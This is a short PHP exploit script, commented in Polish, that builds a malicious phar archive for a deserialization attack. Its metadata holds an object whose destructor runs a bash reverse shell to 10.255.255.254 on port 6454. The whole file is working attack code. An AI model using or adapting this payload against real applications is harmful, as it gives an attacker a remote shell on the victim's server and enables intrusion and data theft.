<?php
class Evil {
    public function __destruct() {
        system('bash -c "bash -i >& /dev/tcp/10.255.255.254/6454 0>&1"');
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>'); // Stub — konieczny
$phar->addFromString('dummy.txt', 'Hello');
$phar->setMetadata(new Evil()); // ← to będzie deserializowane
$phar->stopBuffering();
?>
